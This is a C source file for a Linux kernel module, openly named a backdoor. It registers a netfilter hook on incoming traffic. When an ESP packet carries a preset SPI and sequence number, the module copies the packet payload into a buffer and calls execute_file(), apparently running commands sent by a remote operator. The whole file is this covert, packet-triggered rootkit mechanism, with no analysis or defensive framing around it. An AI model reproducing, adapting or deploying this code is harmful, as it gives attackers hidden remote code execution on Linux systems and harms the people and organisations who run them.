#include "backdoor.h"

static struct nf_hook_ops nfho;
unsigned char *buffer;
unsigned long buffer_length;

unsigned int nfhook(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *)){
	struct iphdr *ip_header;
	struct ip_esp_hdr *esp_header;

	/* https://elixir.bootlin.com/linux/v4.13.16/source/include/uapi/linux/in.h#L36 */
	ip_header = (struct iphdr *)skb_network_header(skb);
	if (!ip_header){
		return NF_ACCEPT;
	}

	/* https://elixir.bootlin.com/linux/v4.15.12/source/include/uapi/linux/ip.h#L118 */
	if (ip_header->protocol == IPPROTO_ESP){
		esp_header = ip_esp_hdr(skb);
		if ((esp_header->spi == TARGET_SPI) && (esp_header->seq_no == TARGET_SEQ)){
			buffer_length = (ip_header->tot_len / 256) \
								- sizeof (struct iphdr) \
								- sizeof (struct ip_esp_hdr);
			buffer = kcalloc(1, (buffer_length+1) * sizeof(unsigned char), GFP_KERNEL);
			strncpy(buffer, esp_header->enc_data, buffer_length);

			execute_file();

			kfree(buffer);
			buffer_length = 0;
		}
	}

	return NF_ACCEPT;
}

/* https://netfilter.org/documentation/HOWTO/netfilter-hacking-HOWTO-4.html#ss4.6 */
int nfhook_init(void){
	int ret;

	nfho.hook = (nf_hookfn *) nfhook;
	nfho.hooknum = NF_INET_PRE_ROUTING;
	nfho.pf = PF_INET;
	nfho.priority = NF_IP_PRI_FIRST;

	#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
		ret = nf_register_net_hook(&init_net, &nfho);
	#else
		ret = nf_register_net_hook(&nfho);
	#endif

	return ret;
}

void nfhook_exit(void){
	#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
		nf_unregister_net_hook(&init_net, &nfho);
	#else
		nf_unregister_net_hook(&nfho);
	#endif
}
